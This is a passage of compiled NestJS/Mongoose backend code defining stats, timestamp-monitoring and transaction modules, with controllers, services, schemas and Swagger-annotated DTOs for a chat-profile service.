    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats2/stat2.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/stat2.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Controller = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
const update_stat2_dto_1 = __webpack_require__(/*! ./update-stat2.dto */ "./src/components/stats2/update-stat2.dto.ts");
let Stat2Controller = class Stat2Controller {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.Stat2Controller = Stat2Controller;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat2_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat2_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], Stat2Controller.prototype, "deleteAll", null);
exports.Stat2Controller = Stat2Controller = __decorate([
    (0, swagger_1.ApiTags)('stats2'),
    (0, common_1.Controller)('stats2'),
    __metadata("design:paramtypes", [stat2_service_1.Stat2Service])
], Stat2Controller);


/***/ }),

/***/ "./src/components/stats2/stat2.module.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Module = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat2_service_1 = __webpack_require__(/*! ./stat2.service */ "./src/components/stats2/stat2.service.ts");
const stat2_controller_1 = __webpack_require__(/*! ./stat2.controller */ "./src/components/stats2/stat2.controller.ts");
const stat2_schema_1 = __webpack_require__(/*! ./stat2.schema */ "./src/components/stats2/stat2.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let Stat2Module = class Stat2Module {
};
exports.Stat2Module = Stat2Module;
exports.Stat2Module = Stat2Module = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "Stats2Module", collection: "stats2", schema: stat2_schema_1.StatSchema }])
        ],
        controllers: [stat2_controller_1.Stat2Controller],
        providers: [stat2_service_1.Stat2Service],
        exports: [stat2_service_1.Stat2Service]
    })
], Stat2Module);


/***/ }),

/***/ "./src/components/stats2/stat2.schema.ts":
/*!***********************************************!*\
  !*** ./src/components/stats2/stat2.schema.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat2 = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat2 = class Stat2 {
};
exports.Stat2 = Stat2;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat2.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat2.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat2.prototype, "profile", void 0);
exports.Stat2 = Stat2 = __decorate([
    (0, mongoose_1.Schema)()
], Stat2);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat2);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats2/stat2.service.ts":
/*!************************************************!*\
  !*** ./src/components/stats2/stat2.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.Stat2Service = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let Stat2Service = class Stat2Service {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.Stat2Service = Stat2Service;
exports.Stat2Service = Stat2Service = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("Stats2Module")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], Stat2Service);


/***/ }),

/***/ "./src/components/stats2/update-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/update-stat2.dto.ts ***!
  \***************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat2_dto_1 = __webpack_require__(/*! ./create-stat2.dto */ "./src/components/stats2/create-stat2.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat2_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/timestamps/timestamp.controller.ts":
/*!***********************************************************!*\
  !*** ./src/components/timestamps/timestamp.controller.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
let TimestampController = class TimestampController {
    constructor(timestampService) {
        this.timestampService = timestampService;
    }
    async findOne() {
        return this.timestampService.findOne();
    }
    async getClientsWithTimeDifference(thresholdMinutes) {
        const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;
        return this.timestampService.getClientsWithTimeDifference(threshold);
    }
    async update(updateTimestampDto) {
        return this.timestampService.update(updateTimestampDto);
    }
};
exports.TimestampController = TimestampController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get timestamp data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)('stalled'),
    (0, swagger_1.ApiOperation)({ summary: 'Get clients with time differences greater than threshold' }),
    (0, swagger_1.ApiQuery)({
        name: 'threshold',
        type: Number,
        required: false,
        description: 'Minimum time difference in minutes (default: 3)'
    }),
    __param(0, (0, common_1.Query)('threshold')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Number]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "getClientsWithTimeDifference", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update timestamp data' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], TimestampController.prototype, "update", null);
exports.TimestampController = TimestampController = __decorate([
    (0, swagger_1.ApiTags)('Timestamps'),
    (0, common_1.Controller)('timestamps'),
    __metadata("design:paramtypes", [timestamp_service_1.TimestampService])
], TimestampController);


/***/ }),

/***/ "./src/components/timestamps/timestamp.module.ts":
/*!*******************************************************!*\
  !*** ./src/components/timestamps/timestamp.module.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const timestamp_service_1 = __webpack_require__(/*! ./timestamp.service */ "./src/components/timestamps/timestamp.service.ts");
const timestamp_controller_1 = __webpack_require__(/*! ./timestamp.controller */ "./src/components/timestamps/timestamp.controller.ts");
const timestamps_schema_1 = __webpack_require__(/*! ./timestamps.schema */ "./src/components/timestamps/timestamps.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TimestampModule = class TimestampModule {
};
exports.TimestampModule = TimestampModule;
exports.TimestampModule = TimestampModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{
                    name: 'timestampModule',
                    collection: 'timestamps',
                    schema: timestamps_schema_1.TimestampSchema
                }]),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
        ],
        providers: [timestamp_service_1.TimestampService],
        controllers: [timestamp_controller_1.TimestampController],
        exports: [timestamp_service_1.TimestampService],
    })
], TimestampModule);


/***/ }),

/***/ "./src/components/timestamps/timestamp.service.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamp.service.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let TimestampService = class TimestampService {
    constructor(timestampModel, clientService) {
        this.timestampModel = timestampModel;
        this.clientService = clientService;
    }
    async findOne() {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (timestamp._id) {
            delete timestamp._id;
        }
        return timestamp;
    }
    async getTimeDifferences(threshold = 3 * 60 * 1000) {
        const timestamp = await this.timestampModel.findOne({}).lean().exec();
        if (!timestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        const currentTime = Date.now();
        const differences = {};
        Object.keys(timestamp).forEach(key => {
            if (key === '_id' || typeof timestamp[key] !== 'number') {
                return;
            }
            const difference = currentTime - timestamp[key];
            if (difference > threshold) {
                differences[key] = difference;
            }
        });
        return differences;
    }
    async getClientsWithTimeDifference(threshold = 3 * 60 * 1000) {
        const differences = await this.getTimeDifferences(threshold);
        const clientIds = Object.keys(differences);
        if (clientIds.length === 0) {
            return [];
        }
        const urls = [];
        for (const clientId of clientIds) {
            const clientParams = clientId.split('_');
            try {
                const client = await this.clientService.findOne(clientParams[0], false);
                if (client) {
                    if (clientParams[1]) {
                        urls.push(client.promoteRepl);
                    }
                    else {
                        urls.push(client.repl);
                    }
                }
            }
            catch (error) {
                console.error(`Error fetching client with ID ${clientId}:`, error.message);
            }
        }
        return urls;
    }
    async update(updateTimestampDto) {
        delete updateTimestampDto['_id'];
        const updatedTimestamp = await this.timestampModel.findOneAndUpdate({}, { $set: { ...updateTimestampDto } }, { new: true, upsert: true, lean: true }).exec();
        if (!updatedTimestamp) {
            throw new common_1.NotFoundException(`Timestamp not found`);
        }
        if (updatedTimestamp._id) {
            delete updatedTimestamp._id;
        }
        return updatedTimestamp;
    }
};
exports.TimestampService = TimestampService;
exports.TimestampService = TimestampService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('timestampModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], TimestampService);


/***/ }),

/***/ "./src/components/timestamps/timestamps.schema.ts":
/*!********************************************************!*\
  !*** ./src/components/timestamps/timestamps.schema.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TimestampSchema = exports.Timestamp = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Timestamp = class Timestamp {
};
exports.Timestamp = Timestamp;
exports.Timestamp = Timestamp = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        strict: false,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Timestamp);
exports.TimestampSchema = mongoose_1.SchemaFactory.createForClass(Timestamp);
exports.TimestampSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/transactions/dto/create-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/create-transaction.dto.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateTransactionDto = exports.TransactionStatus = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var TransactionStatus;
(function (TransactionStatus) {
    TransactionStatus["PENDING"] = "pending";
    TransactionStatus["COMPLETED"] = "completed";
    TransactionStatus["FAILED"] = "failed";
    TransactionStatus["CANCELLED"] = "cancelled";
})(TransactionStatus || (exports.TransactionStatus = TransactionStatus = {}));
class CreateTransactionDto {
    constructor() {
        this.profile = "undefined";
        this.chatId = "undefined";
        this.ip = "undefined";
        this.status = TransactionStatus.PENDING;
    }
}
exports.CreateTransactionDto = CreateTransactionDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique transaction ID (UTR)',
        example: 'TXN123456789',
        minLength: 8
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.MinLength)(8),
    (0, class_transformer_1.Transform)(({ value }) => typeof value === 'string' ? value.toLowerCase() : value),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Amount involved in the transaction',
        example: 100.50,
        minimum: 0
    }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_transformer_1.Transform)(({ value }) => parseFloat(value)),
    __metadata("design:type", Number)
], CreateTransactionDto.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Issue type reported by the user',
        example: 'payment_failed'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Description of issue reported by the user',
        example: 'Payment failed due to network error'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Refund method selected by the user',
        example: 'bank_transfer',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User profile ID',
        example: 'user123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'User chat ID',
        example: 'chat123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'IP address of the user',
        example: '192.168.1.1',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Transaction status',
        enum: TransactionStatus,
        default: TransactionStatus.PENDING,
        required: false
    }),
    (0, class_validator_1.IsEnum)(TransactionStatus),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], CreateTransactionDto.prototype, "status", void 0);


/***/ }),

/***/ "./src/components/transactions/dto/update-transaction.dto.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/dto/update-transaction.dto.ts ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateTransactionDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
class UpdateTransactionDto extends (0, swagger_1.PartialType)(create_transaction_dto_1.CreateTransactionDto) {
}
exports.UpdateTransactionDto = UpdateTransactionDto;


/***/ }),

/***/ "./src/components/transactions/schemas/transaction.schema.ts":
/*!*******************************************************************!*\
  !*** ./src/components/transactions/schemas/transaction.schema.ts ***!
  \*******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionSchema = exports.Transaction = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
